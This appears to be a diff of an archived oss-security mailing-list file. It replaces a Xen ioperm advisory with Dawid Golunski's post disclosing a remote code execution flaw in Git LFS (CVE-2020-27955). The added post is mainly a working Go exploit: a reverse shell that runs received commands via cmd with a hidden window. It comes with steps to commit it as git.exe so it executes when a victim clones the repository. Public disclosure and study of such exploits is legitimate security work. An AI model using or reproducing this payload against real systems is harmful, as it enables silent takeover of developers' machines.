@@ -1,109 +1,103 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/07/16/1
-Message-Id: <E1jw3ms-0006i6-Se@xenbits.xenproject.org>
-Date: Thu, 16 Jul 2020 13:18:58 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 329 v2 - Linux ioperm bitmap context switching issues
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/05/1
+Message-ID: <CADSYzstg3moNw6mtorU6oR01hYAOL+diDSq4A1SK+AKzR8u7qg@mail.gmail.com>
+Date: Wed, 4 Nov 2020 23:26:40 -0300
+From: Dawid Golunski <dawid@...alhackers.com>
+To: oss-security@...ts.openwall.com
+Subject: Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+/*
+   Go PoC exploit for git-lfs -  Remote Code Execution (RCE)
+vulnerability CVE-2020-27955
+   git-lfs-RCE-exploit-CVE-2020-27955.go
 
-                    Xen Security Advisory XSA-329
-                              version 2
-
-             Linux ioperm bitmap context switching issues
-
-UPDATES IN VERSION 2
-====================
-
-Public release.
-
-ISSUE DESCRIPTION
-=================
-
-Linux 5.5 overhauled the internal state handling for the iopl() and ioperm()
-system calls.  Unfortunately, one aspect on context switch wasn't wired up
-correctly for the Xen PVOps case.
-
-IMPACT
-======
-
-IO port permissions don't get rescinded when context switching to an
-unprivileged task.  Therefore, all userspace can use the IO ports granted to
-the most recently scheduled task with IO port permissions.
-
-VULNERABLE SYSTEMS
-==================
-
-Only x86 guests are vulnerable.
-
-All versions of Linux from 5.5 are potentially vulnerable.
-
-Linux is only vulnerable when running as x86 PV guest.  Linux is not
-vulnerable when running as an x86 HVM/PVH guests.
-
-The vulnerability can only be exploited in domains which have been granted
-access to IO ports by Xen.  This is typically only the hardware domain, and
-guests configured with PCI Passthrough.
-
-MITIGATION
-==========
-
-Running only HVM/PVH guests avoids the vulnerability.
-
-CREDITS
-=======
-
-This issue was discovered by Andy Lutomirski.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-xsa329.patch           Linux 5.5 and later
-
-$ sha256sum xsa329*
-cdb5ac9bfd21192b5965e8ec0a1c4fcf12d0a94a962a8158cd27810e6aa362f0  xsa329.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
+   Discovered by Dawid Golunski
+   https://legalhackers.com
+   https://exploitbox.io
 
 
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
+   Affected (RCE exploit):
+   Git / GitHub CLI / GitHub Desktop / Visual Studio / GitKraken /
+SmartGit / SourceTree etc.
+   Basically the whole Windows dev world which uses git.
 
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
+   Usage:
+   Compile: go build git-lfs-RCE-exploit-CVE-2020-27955.go
+   Save & commit as git.exe
 
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAl8QU6EMHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZ/sEIAMiCOnz119KTlRU50HTwa4pvIgLphf9htTbPzHXS
-iEb8yINqMxmep8NRcAzwFREQP+Z4Tue1upt31Vx0RPkFZpUklLuuBSXsV0JA7+UM
-LSGyWhkzDdnfj6iPUHycGmFzRTzkbB7qfcMj7khCvuYtSNbTUdOgUq04ngZksrSJ
-UMhfgUNKXawULKvVe7572L/AQTmMXK8eaolb+eWtf1U2pFkZQR8GWoLmiFbKLks2
-X2tRUF4U4cHEBzxXRzYrD1ArWLajqK6hQmauwgkCCSowvCHoD1dTv55GlrlEo4od
-MSB6YOVLl7HJuUw1GmwlKjA8XqStHq1Fi0urvlKCfHfK2Wk=
-=MP+m
------END PGP SIGNATURE-----
+   The payload should get executed automatically on git clone operation.
+   It spawns a reverse shell, or a calc.exe for testing (if it
+couldn't connect).
 
-Download attachment "xsa329.patch" of type "application/octet-stream" (5266 bytes)
+   An lfs-enabled repository with lfs files may also be needed so that git-lfs
+gets invoked. This can be achieved with:
+
+   git lfs track "*.dat"
+   echo "fat bug file" > lfsdata.dat
+   git add .*
+   git add *
+   git commmit -m 'git-lfs exploit' -a
+
+   Check out the full advisory for details:
+
+   https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html
+   https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html
+
+   PoC video at:
+   https://youtu.be/tlptOf9w274
+
+ ** For testing purposes only **
+
+
+*/
+
+package main
+import (
+    "net"
+    "os/exec"
+    "bufio"
+    "syscall"
+)
+
+
+func revsh(host string) {
+
+    c, err := net.Dial("tcp", host)
+    if nil != err {
+    // Conn failed
+        if nil != c {
+            c.Close()
+        }
+        // Calc for testing purposes if no listener available
+        cmd := exec.Command("calc")
+        cmd.Run()
+        return
+    }
+
+    r := bufio.NewReader(c)
+    for {
+        runcmd, err := r.ReadString('\n')
+        if nil != err {
+            c.Close()
+            return
+        }
+        cmd := exec.Command("cmd", "/C", runcmd)
+        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        out, _ := cmd.CombinedOutput()
+        c.Write(out)
+    }
+}
+
+// Connect to netcat listener on local port 1337
+func main() {
+    revsh("localhost:1337")
+}
+
+
+-- 
+Regards,
+Dawid Golunski
+https://legalhackers.com
+https://ExploitBox.io
+t: @dawid_golunski
